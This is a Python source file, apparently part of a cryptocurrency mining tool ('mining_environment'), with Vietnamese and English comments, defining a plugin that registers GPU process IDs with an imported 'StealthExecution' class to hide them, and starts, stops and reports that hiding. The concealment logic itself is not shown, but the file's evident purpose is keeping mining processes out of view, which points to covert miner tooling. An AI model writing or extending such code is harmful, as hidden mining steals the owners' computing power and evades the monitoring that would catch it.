"""mining_environment.stealth.plugins.stealth_plugin

🎯 **[GPU-Only Stealth Plugin]** (Plugin ẩn danh chỉ dành cho GPU)

GPU stealth plugin sử dụng StealthExecution cho GPU processes.
CPU functionality đã được loại bỏ.
"""
from __future__ import annotations

import logging
import os
import pwd
import grp
import subprocess
from typing import Dict, Any, Optional, Set, List
import ctypes
import ctypes.util

# GPU-only operations - no CPU technique imports needed
from .stealth_exec import StealthExecution


class GPUStealthExecutionPlugin:
    """🎯 **[GPU Stealth Plugin]** (Plugin ẩn danh GPU) sử dụng **StealthExecution** cho GPU processes."""
    
    name = "gpu_stealth_execution"
    priority = 10
    
    def __init__(self):
        """Khởi tạo GPU stealth plugin."""
        self.logger = logging.getLogger(__name__)
        self.stealth_executor: Optional[StealthExecution] = None
        self.engine = None
        self.config = {}
    
    def init(self, engine: Any, config: Optional[Dict[str, Any]] = None) -> bool:
        """Khởi tạo GPU stealth plugin với engine và cấu hình."""
        self.engine = engine
        self.config = config or {}
        
        try:
            self.stealth_executor = StealthExecution(
                logger=self.logger,
                debug_mode=self.config.get("debug_mode", False)
            )
            
            # Start GPU stealth execution if configured
            if self.config.get("start_immediately", False):
                self.stealth_executor.start()
                
            self.logger.info("🎯 [GPU-STEALTH] GPU stealth execution plugin initialized")
            return True
            
        except Exception as e:
            self.logger.error(f"❌ [GPU-STEALTH] Failed to initialize GPU stealth plugin: {e}")
            return False
    
    def apply(self, pid: int) -> bool:
        """
        Áp dụng GPU stealth cho một PID cụ thể.
        
        🎯 GPU processes sử dụng **[self-managed stealth]** thông qua wrappers.
        """
        if not self.stealth_executor:
            self.logger.warning("🎯 [GPU-STEALTH] Stealth executor not initialized")
            return False
        
        # GPU processes tự quản lý stealth, chỉ cần tracking
        self.logger.info(f"🎯 [GPU-STEALTH] Adding GPU PID {pid} to stealth tracking")
        return self.stealth_executor.add_process(pid)
    
    def stop(self) -> bool:
        """Dừng GPU stealth plugin và giải phóng tài nguyên."""
        if self.stealth_executor:
            self.stealth_executor.stop()
            self.stealth_executor = None
            
        self.logger.info("🎯 [GPU-STEALTH] GPU stealth execution plugin stopped")
        return True
    
    def get_gpu_stealth_status(self) -> Dict[str, Any]:
        """
        🎯 **[Get GPU Stealth Status]** (Lấy trạng thái GPU stealth – báo cáo trạng thái hoạt động)
        Return GPU stealth execution status information.
        """
        if self.stealth_executor:
            return self.stealth_executor.get_status()
        else:
            return {
                'running': False,
                'tracked_gpu_pids': [],
                'gpu_processes_count': 0,
                'stealth_method': 'not_initialized'
            } 